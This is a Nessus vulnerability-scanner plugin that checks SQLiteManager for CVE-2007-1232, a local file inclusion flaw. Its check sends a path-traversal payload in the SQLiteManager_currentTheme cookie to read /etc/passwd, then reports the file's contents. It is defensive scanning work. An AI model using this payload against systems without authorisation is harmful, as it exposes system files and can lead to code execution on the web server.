#
# (C) Tenable Network Security
#


include("compat.inc");

if (description)
{
  script_id(24726);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2007-1232");
  script_bugtraq_id(22727);
  script_xref(name:"OSVDB", value:"33801");

  script_name(english:"SQLiteManager SQLiteManager_currentTheme Cookie Traversal Local File Inclusion");
  script_summary(english:"Tries to read a local file with SQLiteManager");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is susceptible to a
local file include attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running SQLiteManager, a web-based application for
managing SQLite databases. 

The version of SQLiteManager installed on the remote host fails to
sanitize user input to the 'SQLiteManager_currentTheme' cookie before
using it to include PHP code in 'include/config.inc.php'.  An
unauthenticated remote attacker may be able to exploit this issue to
view arbitrary files or to execute arbitrary PHP code on the remote
host, subject to the privileges of the web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/461304/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq("/sqlitemanager", "/sqlite", "/db", cgi_dirs());
else dirs = make_list(cgi_dirs());

init_cookiejar();
foreach dir (dirs)
{
  # Try to retrieve a local file.
  file = "../../../../../../../../../../etc/passwd%00";
  set_http_cookie(name: "PHPSESSID", value: "2f90c15e395209823ff978f8bd329dea");
  set_http_cookie(name: "SQLiteManager_currentLangue", value: "deleted");
  set_http_cookie(name: "SQLiteManager_currentTheme", value: file);
  
  r = http_send_recv3(method: "GET", item:string(dir, "/index.php"), port:port);
  if (isnull(r)) exit(0);

  # There's a problem if...
  if (
    # it looks like SQLiteManager and...
    "<title>SQLiteManager" >< r[2] &&
    # there's an entry for root
    egrep(pattern:"root:.*:0:[01]:", string:r[2])
  )
  {
    contents = r[2] - strstr(r[2], "<!DOCTYPE");
    report = string(
      "Here are the contents of the file '/etc/passwd' that Nessus\n",
      "was able to read from the remote host :\n",
      "\n",
      contents
    );

    security_warning(port:port, extra:report);
    exit(0);
  }
}
